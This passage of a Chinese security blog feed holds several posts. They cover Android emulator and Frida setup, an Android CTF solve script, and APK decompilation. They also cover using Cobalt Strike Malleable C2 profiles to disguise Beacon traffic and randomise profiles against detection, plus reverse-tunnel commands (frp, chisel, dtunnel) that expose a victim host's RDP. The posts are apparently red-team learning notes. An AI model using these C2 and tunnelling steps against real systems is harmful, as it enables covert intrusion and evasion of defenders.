127.0.0.1:26966</span><br></pre></td></tr></table></figure><blockquote><p>切记这里使用的是AK中的adb！因为有的人还有自己搭建的adb，包括夜神模拟器中也会有adb，注意区分。</p></blockquote><p><img src="/2020/06/29/AndroidKiller%E9%85%8D%E7%BD%AE/2.png" alt></p><p>上面显示连接AK成功，然后我们在AK中也可以看到成功搜索到了夜神模拟器：</p><p><img src="/2020/06/29/AndroidKiller%E9%85%8D%E7%BD%AE/3.png" alt></p><h2 id="0x01-夜神模拟器搭建frida"><a href="#0x01-夜神模拟器搭建frida" class="headerlink" title="0x01 夜神模拟器搭建frida"></a>0x01 夜神模拟器搭建frida</h2><p>frida是个无敌的框架，我导师叫我去学习一下。所以这里先记录一下搭建的过程：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip install -i https://pypi.tuna.tsinghua.edu.cn/simple/ frida frida-tools</span><br></pre></td></tr></table></figure><blockquote><p>这里用了个小trick就是pip安装也是可以通过i参数指定源的，这里选用清华的源就会下载快很多。</p></blockquote><p><img src="/2020/06/29/AndroidKiller%E9%85%8D%E7%BD%AE/4.png" alt></p><p>然鹅它卡在了安装frida安装的这一步，进行了查阅： <a href="https://www.jianshu.com/p/f91d92ce2b23" target="_blank" rel="noopener">https://www.jianshu.com/p/f91d92ce2b23</a> 。按照帖子的方法进行安装就可以了：</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;AndroidKiller配置&quot;&gt;&lt;a href=&quot;#AndroidKiller配置&quot; class=&quot;headerlink&quot; title=&quot;AndroidKiller配置&quot;&gt;&lt;/a&gt;AndroidKiller配置&lt;/h1&gt;&lt;p&gt;AndroidKiller挺老了，但
      
    
    </summary>
    
    
      <category term="Android" scheme="http://bai-ren-1.github.io/categories/Android/"/>
    
    
  </entry>
  
  <entry>
    <title>Android刷题</title>
    <link href="http://bai-ren-1.github.io/2020/06/29/Android%E5%88%B7%E9%A2%98/"/>
    <id>http://bai-ren-1.github.io/2020/06/29/Android%E5%88%B7%E9%A2%98/</id>
    <published>2020-06-29T14:49:16.000Z</published>
    <updated>2020-11-12T07:15:53.879Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Android刷题"><a href="#Android刷题" class="headerlink" title="Android刷题"></a>Android刷题</h1><p>老样子开始刷题啦，记录记录。</p><h2 id="0x00-EasyAndroid"><a href="#0x00-EasyAndroid" class="headerlink" title="0x00 EasyAndroid"></a>0x00 EasyAndroid</h2><p> <a href="https://github.com/ThunderJie/CTF-Practice/tree/master/CTF-Andorid%20Reverse/androideasy" target="_blank" rel="noopener">https://github.com/ThunderJie/CTF-Practice/tree/master/CTF-Andorid%20Reverse/androideasy</a> </p><p>首先将apk拖进模拟器中安装打开，看到是最简单的注册码（这里是flag）验证的模式：</p><p><img src="/2020/06/29/Android%E5%88%B7%E9%A2%98/1.png" alt></p><p>然后我们把apk拖进JEB进行分析：</p><p><img src="/2020/06/29/Android%E5%88%B7%E9%A2%98/2.png" alt></p><p>因为我们很清楚的看到功能点就在主活动页面上，所以我们跟进MainActivity。然后看onCreate中做了什么。</p><blockquote><p>onCreate()在Activity创建时被系统调用，是一个Activity生命周期的开始；它主要做这个activity启动时的一些必要的初始化工作。</p></blockquote><p>除开绑定布局的语句，自然就跟进按钮onClick的方法。我们能看到只要check方法通过了，就提示flag正确：</p><p><img src="/2020/06/29/Android%E5%88%B7%E9%A2%98/3.png" alt></p><p>那我们跟进check方法：</p><p><img src="/2020/06/29/Android%E5%88%B7%E9%A2%98/4.png" alt></p><p>我们看到byte数组是我们的输入流（这里我为了直观修改了变量名称为input），然后v1是长度下标。只要v1不超过给定的s数组的长度就一直循环，同时只要长度超过我们输入的长度就结束循环，即限定我们输入字符的长度要和给定的s一致。然后核心的算法在于只要输入中的每个字符异或23后能等于s中对应字符，就能继续循环直到返回真，即能判定我们所输入的字符就是flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">byte = [<span class="number">113</span>, <span class="number">123</span>, <span class="number">118</span>, <span class="number">112</span>, <span class="number">108</span>, <span class="number">94</span>, <span class="number">99</span>, <span class="number">72</span>, <span class="number">38</span>, <span class="number">68</span>, <span class="number">72</span>, <span class="number">87</span>, <span class="number">89</span>, <span class="number">72</span>, <span class="number">36</span>, <span class="number">118</span>, <span class="number">100</span>, <span class="number">78</span>, <span class="number">72</span>, <span class="number">87</span>, <span class="number">121</span>, <span class="number">83</span>, <span class="number">101</span>, <span class="number">39</span>, <span class="number">62</span>, <span class="number">94</span>,</span><br><span class="line">        <span class="number">62</span>, <span class="number">38</span>, <span class="number">107</span>, <span class="number">115</span>, <span class="number">106</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">length = len(byte)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> byte:</span><br><span class="line">    <span class="keyword">for</span> z <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">128</span>):</span><br><span class="line">        <span class="keyword">if</span> z ^ <span class="number">23</span> == j:</span><br><span class="line">            flag += chr(z)</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><p>直接脚本爆破每一位flag的值，最后得到答案：</p><p><img src="/2020/06/29/Android%E5%88%B7%E9%A2%98/5.png" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Android刷题&quot;&gt;&lt;a href=&quot;#Android刷题&quot; class=&quot;headerlink&quot; title=&quot;Android刷题&quot;&gt;&lt;/a&gt;Android刷题&lt;/h1&gt;&lt;p&gt;老样子开始刷题啦，记录记录。&lt;/p&gt;
&lt;h2 id=&quot;0x00-EasyAndroi
      
    
    </summary>
    
    
      <category term="Android" scheme="http://bai-ren-1.github.io/categories/Android/"/>
    
    
  </entry>
  
  <entry>
    <title>Android反编译工具</title>
    <link href="http://bai-ren-1.github.io/2020/06/16/Android%E5%8F%8D%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7/"/>
    <id>http://bai-ren-1.github.io/2020/06/16/Android%E5%8F%8D%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7/</id>
    <published>2020-06-16T13:21:25.000Z</published>
    <updated>2020-06-16T14:00:07.626Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Android反编译工具"><a href="#Android反编译工具" class="headerlink" title="Android反编译工具"></a>Android反编译工具</h1><p>在公司开始学习Android（业务驱动），下午做了两种简单的反编译的做法，这里简答记录一下（好久没写博客了休息一下）</p><h2 id="0x00-apktools"><a href="#0x00-apktools" class="headerlink" title="0x00 apktools"></a>0x00 apktools</h2><p>apktools的项目地址： <a href="https://bitbucket.org/iBotPeaches/apktool/downloads/" target="_blank" rel="noopener">https://bitbucket.org/iBotPeaches/apktool/downloads/</a> 。直接把最新版本的jar文件下载到本地，然后我们cd到apktools目录中使用下面命令就能看到使用说明。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar apktool_2.4.1.jar</span><br></pre></td></tr></table></figure><p><img src="/2020/06/16/Android%E5%8F%8D%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7/1.png" alt></p><p>然后我们指定d参数就能进行反编译啦：</p><p><img src="/2020/06/16/Android%E5%8F%8D%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7/2.png" alt></p><p>然后我们就能在当前目录下看到反编译出来的文件夹结果：</p><p><img src="/2020/06/16/Android%E5%8F%8D%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7/3.png" alt></p><p>可以看到反编译出来的是smali语言：</p><p><img src="/2020/06/16/Android%E5%8F%8D%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7/4.png" alt></p><h2 id="0x01-dex2jar搭配-jd-gui"><a href="#0x01-dex2jar搭配-jd-gui" class="headerlink" title="0x01 dex2jar搭配 jd-gui"></a>0x01 dex2jar搭配 jd-gui</h2><p>将安装包shabi.apk后缀改为.zip，解压后拷贝classes.dex文件到dex2jar文件目录下，</p><p><img src="/2020/06/16/Android%E5%8F%8D%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7/5.png" alt></p><p>cmd进入改目录，执行下面命令，会生成classes-dex2jar.jar文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dex2jar.bat classes.dex</span><br></pre></td></tr></table></figure><p><img src="/2020/06/16/Android%E5%8F%8D%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7/6.png" alt></p><p>使用 jd-gui 打开生成的jar.jar文件就能看到反编译出来的代码啦：</p><p><img src="/2020/06/16/Android%E5%8F%8D%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7/7.png" alt></p><p>这里看到的就是java代码啦，还是方便很多的。</p><h2 id="0x02-小结"><a href="#0x02-小结" class="headerlink" title="0x02 小结"></a>0x02 小结</h2><p>很简单的内容，记录一下练手。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Android反编译工具&quot;&gt;&lt;a href=&quot;#Android反编译工具&quot; class=&quot;headerlink&quot; title=&quot;Android反编译工具&quot;&gt;&lt;/a&gt;Android反编译工具&lt;/h1&gt;&lt;p&gt;在公司开始学习Android（业务驱动），下午做了两种简单的
      
    
    </summary>
    
    
      <category term="Android" scheme="http://bai-ren-1.github.io/categories/Android/"/>
    
    
  </entry>
  
  <entry>
    <title>Malleable_C2_Profile</title>
    <link href="http://bai-ren-1.github.io/2020/04/16/Malleable_C2_Profile/"/>
    <id>http://bai-ren-1.github.io/2020/04/16/Malleable_C2_Profile/</id>
    <published>2020-04-16T08:55:13.000Z</published>
    <updated>2020-06-29T13:13:37.255Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Malleable-C2-Profile"><a href="#Malleable-C2-Profile" class="headerlink" title="Malleable_C2_Profile"></a>Malleable_C2_Profile</h1><p>Malleable_C2_Profile是CobaltStrike中一种配置文件。目的是用来伪装流量，让通讯更加隐蔽。下面贴上  <a href="https://wbglil.gitbooks.io/cobalt-strike/content/cobalt-strikekuo-zhan/malleable-c2.html" target="_blank" rel="noopener">https://wbglil.gitbooks.io/cobalt-strike/content/cobalt-strikekuo-zhan/malleable-c2.html</a>  上的解释。</p><blockquote><p>Cobalt Strike的 Malleable-C2-Profiles配置文件是用来伪装流量，让通讯更加隐蔽和控制其行为的一种方式。</p><p>Beacon中使用http通信的payload由Malleable-C2-profile文件控制，关于Malleable-C2-profile，它是一个简单的配置文件，用来指定如何转换数据并将其存储在transaction中，转换和存储数据的相同配置文件也从transaction中提取和恢复。</p></blockquote><h2 id="0x00-加载方式"><a href="#0x00-加载方式" class="headerlink" title="0x00 加载方式"></a>0x00 加载方式</h2><p>首先贴上别人制作好的混淆profile，<a href="https://github.com/rsmudge/Malleable-C2-Profiles。加载profile的方式也很简单，在开启CobaltStrike（下面简称：CS）的命令时，在ip和密码后加上你的profile的路径就能让服务器通信时使用profile进行流量混淆达成隐藏的目的。如下所示：" target="_blank" rel="noopener">https://github.com/rsmudge/Malleable-C2-Profiles。加载profile的方式也很简单，在开启CobaltStrike（下面简称：CS）的命令时，在ip和密码后加上你的profile的路径就能让服务器通信时使用profile进行流量混淆达成隐藏的目的。如下所示：</a></p><ul><li>启动CS的teamserver时同时加载Malleable-C2-Profiles命令</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./teamserver [external IP] [password] [/path/to/my.profile]</span><br></pre></td></tr></table></figure><ul><li>检查预览Profiles文件</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./c2lint [/path/to/my.profile]</span><br></pre></td></tr></table></figure><h2 id="0x01-使用实例"><a href="#0x01-使用实例" class="headerlink" title="0x01 使用实例"></a>0x01 使用实例</h2><p>因为是在公司的资产上进行攻击的，这里就不放上截图了。稍微记录一下手法就可以了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CS服务器：10.100.19.19</span><br><span class="line">CS客户端：10.100.19.19</span><br><span class="line">受害机：20.100.0.25</span><br></pre></td></tr></table></figure><p>首先启动CS服务器，这里假设使用的混淆profile名为amazon.profile</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CS服务器：</span><br><span class="line">./teamserver 10.100.19.19 123456 /opt/malleable_C2_profile/amazon.profile</span><br></pre></td></tr></table></figure><p>然后我们在同一部主机另开终端连接CS服务，成为CS客户端</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CS客户端</span><br><span class="line">./start.sh 10.100.19.19 123456</span><br></pre></td></tr></table></figure><p>然后CS就会执行进入图形化界面。直接使用默认的端口和用户名密码点击connect进入CS页面。我们要给受害机开启一个监听端口，点击“CobaltStrike -&gt; listeners”，然后选择参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Name：didi</span><br><span class="line">Paylaod：Beacon Http</span><br><span class="line">HTTP Hosts：10.10.19.19</span><br><span class="line">HTTP Hosts（Stager）：10.10.19.19</span><br><span class="line">Profile:defualt</span><br><span class="line">HTTP Port(C2):80</span><br></pre></td></tr></table></figure><p>这样就就在CS服务器上开启了80端口监听受害机流量啦，并且通过http形式进行传输。我们现在要生成控制客户端的恶意软件，这里有很多种形式。下面是参考链接：<a href="https://blog.csdn.net/weixin_44677409/article/details/102725129" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44677409/article/details/102725129</a> </p><p>这里我继续我自己的做法，我想生成一个受害机上运行的恶意文件。点击“Attack -&gt; Packeges -&gt; Windows Executables”，然后选择刚刚添加的监听并点击Generate进行构建。然后我们将输出的exe上传到受害主机上，只要受害机一点击，马上就能在CS上上线。</p><p>然后因为我们选择了profile，所以抓包观察的话能看到，通信请求都被伪造成对amazon的请求，能在一定程度上达成混淆视听的作用。</p><h2 id="0x02-随机profile"><a href="#0x02-随机profile" class="headerlink" title="0x02 随机profile"></a>0x02 随机profile</h2><p>因为这个profile库已经发布很久了，我个人感觉肯定很多对其进行样本添加了，那我们应该对其进行随机化进行绕检测。</p><p>工具链接：<a href="https://github.com/bluscreenofjeff/Malleable-C2-Randomizer。因为今天在公司上打了一份详细使用，这里就不详细写了，就稍微记录一下简单的命令即可：" target="_blank" rel="noopener">https://github.com/bluscreenofjeff/Malleable-C2-Randomizer。因为今天在公司上打了一份详细使用，这里就不详细写了，就稍微记录一下简单的命令即可：</a></p><ul><li>模板的具体样本的生成<ul><li>我们可以使用它给我们的模板（/sample template），然后执行“python malleable-c2-randomizer.py -profile /opt/Malleable-C2-Randomizer/amazon.profile -count 2 -cobalt /opt/cobaltstrike4.0 -output shabi”直接生成它预设的模板的2个样本。</li><li>我们也可以自己在想改的地方改成“%%wordlist%%”，然后执行“python malleable-c2-randomizer.py -profile /opt/Malleable-C2-Randomizer/amazon.profile -count 1 -cobalt /opt/cobaltstrike4.0 -wordlist /opt/hostname.txt -output shabi”（/opt/hostname.txt里面就是自己写好的想要替换进去模板种的%%wordlist%%的具体内容）生成我们需要的模板的1个样本。</li></ul></li><li>然后根据上一章节一样的启动方法，把指定profile路径的那个位置修改为刚刚Randomize生成新的profile的路径，然后启动即可。</li></ul><h2 id="0x03-小结"><a href="#0x03-小结" class="headerlink" title="0x03 小结"></a>0x03 小结</h2><p>CS是今天第一次接触，就这个隐藏通信流量就已经感觉到了他的强大之处，继续努力变得更强。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Malleable-C2-Profile&quot;&gt;&lt;a href=&quot;#Malleable-C2-Profile&quot; class=&quot;headerlink&quot; title=&quot;Malleable_C2_Profile&quot;&gt;&lt;/a&gt;Malleable_C2_Profile&lt;/h1&gt;&lt;
      
    
    </summary>
    
    
      <category term="后渗透" scheme="http://bai-ren-1.github.io/categories/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>红队代理工具</title>
    <link href="http://bai-ren-1.github.io/2020/04/16/%E7%BA%A2%E9%98%9F%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7/"/>
    <id>http://bai-ren-1.github.io/2020/04/16/%E7%BA%A2%E9%98%9F%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7/</id>
    <published>2020-04-16T08:45:00.000Z</published>
    <updated>2020-06-16T13:28:10.032Z</updated>
    
    <content type="html"><![CDATA[<h1 id="红队代理工具"><a href="#红队代理工具" class="headerlink" title="红队代理工具"></a>红队代理工具</h1><p>好久没写博客了，最近一直复现各类代理和隧道的使用并且抓取通信流量进行分析。写这个文章，一是为了总结用法，而是为了记录工作的进展。</p><h2 id="0x00-frp"><a href="#0x00-frp" class="headerlink" title="0x00 frp"></a>0x00 frp</h2><p>frp需要三台主机，一台内网受害机，一台外网服务机，一台外网攻击访问机。</p><ul><li>服务端配置frps.ini监听端口，然后./frps -c ./frps.ini开启监听。</li><li>客户端配置frpc.ini服务端地址和端口和使用的协议，然后./frpc -c ./frpc.ini开启。</li></ul><p>协议完成进度</p><ul><li><input checked disabled type="checkbox"> tcp</li><li><input disabled type="checkbox"> udp</li><li><input checked disabled type="checkbox"> stcp</li></ul><blockquote><p>开启kali服务端./frps -c ./frps.ini。根据github的wiki上的配置，使用./frpc -c ./frpc.ini让受害机连接到kali。然后根据github的wiki上的配置，使用./frpc -c ./frpc让访问机连接到kali。然后访问机访问配置中自己本地的端口即可连接到受害机上</p></blockquote><ul><li><input checked disabled type="checkbox"> xtcp</li></ul><blockquote><p>首先根据wiki在服务端的./frps.ini添加udp的监听端口。然后开启kali服务端./frps -c ./frps.ini。根据github的wiki上的配置，使用./frpc -c ./frpc.ini让受害机连接到kali。然后根据github的wiki上的配置，使用./frpc -c ./frpc让访问机连接到kali。然后访问机访问配置中自己本地的端口即可连接到受害机上</p></blockquote><h2 id="0x01-fcn"><a href="#0x01-fcn" class="headerlink" title="0x01 fcn"></a>0x01 fcn</h2><p>fcn需要两台主机，一台内网受害机，一台外网攻击机（其客户端和服务端与其他相反）。</p><ul><li>在内网主机上开启fcn后点击服务端，配置好密码并开启服务。</li><li>在外网攻击机上开启fcn后点击客户端，配置好名称和ID密码等后等待连接成功。</li><li>连接成功后外网主机就能直接mstsc连接到内网主机上。</li></ul><p>协议完成进度</p><ul><li><input checked disabled type="checkbox"> <p>tcp</p></li><li><input checked disabled type="checkbox"> <p>udp</p></li><li><input disabled type="checkbox"> <p>tls</p></li></ul><h2 id="0x02-ngrok"><a href="#0x02-ngrok" class="headerlink" title="0x02 ngrok"></a>0x02 ngrok</h2><p>ngrok需要两台主机，一台内网受害机，一台外网攻击机。</p><ul><li>在ngrok官网申请个人账号，然后记录自己的token，下载客户端。</li><li>将客户端上传到受害机上，然后在受害机的cmd上按格式使用命令ngrok tcp 3389就能把本地远程桌面映射到ngrok提供的域名的端口上。</li><li>在攻击机上mstsc到ngrok提供的域名端口即可远程连接。</li></ul><p>协议完成进度</p><ul><li><input checked disabled type="checkbox"> tcp</li><li><input disabled type="checkbox"> udp</li></ul><h2 id="0x03-sunny-ngrok"><a href="#0x03-sunny-ngrok" class="headerlink" title="0x03 sunny-ngrok"></a>0x03 sunny-ngrok</h2><p>sunny-ngrok需要两台主机，一台内网受害机，一台外网攻击机。</p><ul><li>在ngrok官网申请个人账号，并开通隧道获取隧道ID，下载客户端。</li><li>将客户端上传到受害机上，然后在受害机上使用客户端按官网wiki的格式执行命令。其中隧道ID用于启动隧道，就能把本地远程桌面映射到sunny-ngrok提供的域名端口上。</li><li>在攻击机上mstsc到sunny-ngrok提供的域名端口即可远程连接。</li></ul><p>协议完成进度</p><ul><li><input checked disabled type="checkbox"> tcp</li><li><input disabled type="checkbox"> udp</li></ul><h2 id="0x04-natapp"><a href="#0x04-natapp" class="headerlink" title="0x04 natapp"></a>0x04 natapp</h2><p>natapp需要两台主机，一台内网受害机，一台外网攻击机。</p><ul><li>在natapp官网申请个人账号，并获取authtoken，下载客户端。</li><li>将客户端上传到受害机上，然后在受害机上运行客户端，通过指定authtoken启动隧道，就能把本地远程桌面映射到natapp提供的域名端口上。</li><li>在攻击机上mstsc到natapp提供的域名端口即可远程连接。</li></ul><p>协议完成进度</p><ul><li><input checked disabled type="checkbox"> tcp</li><li><input disabled type="checkbox"> udp </li></ul><h2 id="0x05-小米球"><a href="#0x05-小米球" class="headerlink" title="0x05 小米球"></a>0x05 小米球</h2><p>小米球需要两台主机，一台内网受害机，一台外网攻击机。</p><ul><li>在小米球官网申请个人账号，下载客户端。</li><li>将客户端上传到受害机上，在yml配置文件里面写好映射的本地端口和隧道名，使用cmd按官网教程格式运行命令，小米球就能把本地远程桌面映射到natapp提供的域名端口上。</li><li>在攻击机上mstsc到natapp提供的域名端口即可远程连接。</li></ul><p>协议完成进度</p><ul><li><input checked disabled type="checkbox"> tcp</li><li><input disabled type="checkbox"> udp </li></ul><h2 id="0x06-nps"><a href="#0x06-nps" class="headerlink" title="0x06 nps"></a>0x06 nps</h2><p>nps的tcp和udp需要三台主机，一台内网受害机，一台外网攻击机，一台外网服务器。</p><ul><li>在外网服务器上开启nps服务，然后进入web页面进行客户端添加和tcp隧道的建立。</li><li>在内网服务器上开启nps服务，连接到外网服务器。</li><li>在外网攻击机上mstsc外网服务器的端口就能连接到内网的3389。</li></ul><p>协议完成进度</p><ul><li><input checked disabled type="checkbox"> tcp</li><li><input disabled type="checkbox"> udp </li></ul><p><strong>sock代理做法</strong></p><p>nps的sock需要三台主机，一台外网服务器，一台内网受害机，一台外网攻击机。</p><ul><li>在外网服务器上开启nps，然后在web页面开启自己的代理监听端口。</li><li>在受害机上开启npc，然后连接到外网服务器上。</li><li>在攻击机上用proxifier将外网服务器的监听端口添加到代理服务器中，然后找到mstsc<strong>右键</strong>，使用proxifier运行，然后连输入内网主机ip即可远程连接。</li></ul><p>协议完成进度</p><ul><li><input checked disabled type="checkbox"> sock</li></ul><p>其他基本做法都大同小异，可以看下面的参考</p><p> <a href="https://maizer.pw/index.php/archives/37/" target="_blank" rel="noopener">https://maizer.pw/index.php/archives/37/</a> </p><p> <a href="https://maizer.pw/index.php/archives/50/" target="_blank" rel="noopener">https://maizer.pw/index.php/archives/50/</a> </p><p> <a href="https://www.moerats.com/archives/891/" target="_blank" rel="noopener">https://www.moerats.com/archives/891/</a> </p><h2 id="0x07-花生壳"><a href="#0x07-花生壳" class="headerlink" title="0x07 花生壳"></a>0x07 花生壳</h2><p>同上面ngrok系列的做法，因为做了很久就不记录了。</p><h2 id="0x08-狗洞"><a href="#0x08-狗洞" class="headerlink" title="0x08 狗洞"></a>0x08 狗洞</h2><p>狗洞的tcp和udp需要三台主机，一台内网受害机，一台外网攻击机，一台外网服务器。</p><ul><li>在外网服务机上开启狗洞服务，./dtunnel_lite -service 10.100.19.19:1234 -v -xor 12345 (默认udp，<strong>-tcp</strong>指定使用tcp)</li><li>在内网受害机上开启狗洞服务，这里注意需要 <strong>-r 指定反向模式才能反向端口映射</strong>使得内网的3389映射到外网服务器上，dtunnel_lite -service 10.100.19.19:1234 -v -action 127.0.0.1:3389 -encrypt -xor 12345 -local:6666 -r(默认udp，-tcp指定使用tcp)</li><li>在外网攻击机上mstsc外网服务器的6666端口就能连接到内网的3389。</li></ul><p>协议完成进度</p><ul><li><input checked disabled type="checkbox"> tcp</li><li><input checked disabled type="checkbox"> udp</li></ul><p><strong>反向sock5代理做法</strong></p><p>狗洞的sock需要三台主机，一台外网服务器，一台内网受害机，一台外网攻击机。</p><ul><li>在外网服务器上开启狗洞服务，./dtunnel_lite -service 10.100.19.19:1234 -v -xor 12345</li><li>在受害机上开启狗洞服务，这里注意需要 <strong>-r 指定反向模式才能反向代理</strong>使得设置内网机器的反向代理机器为外网服务器，dtunnel_lite -service 10.100.19.19:1234 -v -action  socks5 -encrypt -xor 12345 -local:8787 -r</li><li>在攻击机上用proxifier将外网服务器的10.100.19.19和反向监听端口8787添加到代理服务器中，然后找到mstsc<strong>右键使用proxifier运行</strong>，然后连输入内网主机ip即可远程连接。</li></ul><p>协议完成进度</p><ul><li><input checked disabled type="checkbox"> sock5</li></ul><h2 id="0x09-Chisel"><a href="#0x09-Chisel" class="headerlink" title="0x09 Chisel"></a>0x09 Chisel</h2><p>官方文档就是一坨屎，这两个个链接不错： </p><p><a href="https://www.puckiestyle.nl/pivot-with-chisel/" target="_blank" rel="noopener">https://www.puckiestyle.nl/pivot-with-chisel/</a> </p><p><a href="https://www.cnblogs.com/heycomputer/articles/10697828.html" target="_blank" rel="noopener">https://www.cnblogs.com/heycomputer/articles/10697828.html</a> </p><p>chisel的tcp需要两台主机，一台内网受害机，一台外网攻击机。</p><ul><li>在外网攻击机上开启监听端口，chisel server -p 1111 -reverse。</li><li>在内网受害机上将本地端口反向映射到外网攻击机上，chisel client 10.100.19.30:1111 R:2222：127.0.0.1:3389。</li><li>在外网攻击机上自己日自己的2222端口即可访问到内网受害机，mstsc 127.0.0.1:2222。</li></ul><p>协议完成进度</p><ul><li><input checked disabled type="checkbox"> tcp</li></ul><p><strong>sock5代理做法</strong></p><p>chisel的sock需要三台主机，一台外网服务器，一台内网受害机，一台外网攻击机。</p><ul><li>在外网服务器上开启chisel服务，chisel server -p 1111 -reverse，开启<strong>建立连接</strong>的监听端口。</li><li>在内网受害机上连接并开启<strong>反向sock5</strong>服务，chisel client 10.100.19.30:1111 5555:socks，让服务器的5555端口开启sock5，<strong>反向代理</strong>访问内网受害机的流量。</li><li>在外网攻击机上连接20.100.0.25，内网响应后传给反向代理服务器即外网服务器，然后外网服务器和外网攻击机都在外能能通信，所以就能成功连接。</li></ul><p>未成功，应该是反向代理没设置好。</p><ul><li><input disabled type="checkbox"> sock</li></ul><h2 id="0x10-小结"><a href="#0x10-小结" class="headerlink" title="0x10 小结"></a>0x10 小结</h2><p>工具用法何其多，这些并不是重要的。最重要的是，我们要知道里面的原理，然后通过工具去积累思路，尝试自己去写出这样的工具，才是真正的学习呐~</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;红队代理工具&quot;&gt;&lt;a href=&quot;#红队代理工具&quot; class=&quot;headerlink&quot; title=&quot;红队代理工具&quot;&gt;&lt;/a&gt;红队代理工具&lt;/h1&gt;&lt;p&gt;好久没写博客了，最近一直复现各类代理和隧道的使用并且抓取通信流量进行分析。写这个文章，一是为了总结用法，而是
      
    
    </summary>
    
    
      <category term="后渗透" scheme="http://bai-ren-1.github.io/categories/%E5%90%8E%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>Docker</title>
    <link href="http://bai-ren-1.github.io/2020/04/05/Docker/"/>
    <id>http://bai-ren-1.github.io/2020/04/05/Docker/</id>
    <published>2020-04-05T05:01:14.000Z</published>
    <updated>2020-04-05T05:43:31.679Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h1><p>哎，要上班了。在家呆了这么久，突然得自己一人去工作，很不舍。不过，始终得静下心来，毕竟颓了这么久。所以今天写一篇简单的博客，记录一下工作技术栈之一的Docker简单用法。</p><h2 id="0x00-容器使用"><a href="#0x00-容器使用" class="headerlink" title="0x00 容器使用"></a>0x00 容器使用</h2><p>这里我把命令都集合在一起，看起来比较方便。下面都是有关容器的一些用法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ docker pull &lt;镜像名称&gt;  # 获取镜像</span><br><span class="line">$ docker run &lt;镜像名称&gt;       # 启动容器</span><br><span class="line">$ docker ps -a    # 查看所有容器列表</span><br><span class="line">$ docker start &lt;容器 ID&gt;  # 启动已停止的容器</span><br><span class="line">$ docker stop &lt;容器 ID&gt; # 停止容器</span><br><span class="line">$ docker restart &lt;容器 ID&gt; # 重启容器（启动容器是第一次，用的是run且参数是镜像）</span><br><span class="line">$ docker attach &lt;容器 ID&gt; # 进入容器（-d 参数时，容器启动后会进入后台，用attach可进入容器）</span><br><span class="line">$ docker export &lt;容器 ID&gt; &gt; &lt;文件名&gt; # 导出容器</span><br><span class="line">$ docker rm -f &lt;容器 ID&gt;      # 删除容器</span><br></pre></td></tr></table></figure><h2 id="0x01-镜像使用"><a href="#0x01-镜像使用" class="headerlink" title="0x01 镜像使用"></a>0x01 镜像使用</h2><p>OK，看完了容器，我们就来学习用法开启容器的镜像的用法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ docker images  # 列出本地镜像列表</span><br><span class="line">$ docker pull &lt;镜像名称&gt;:&lt;版本号&gt;# 拉取镜像到本地</span><br><span class="line">$ docker search &lt;搜索关键字&gt;  # 查找仓库的镜像</span><br><span 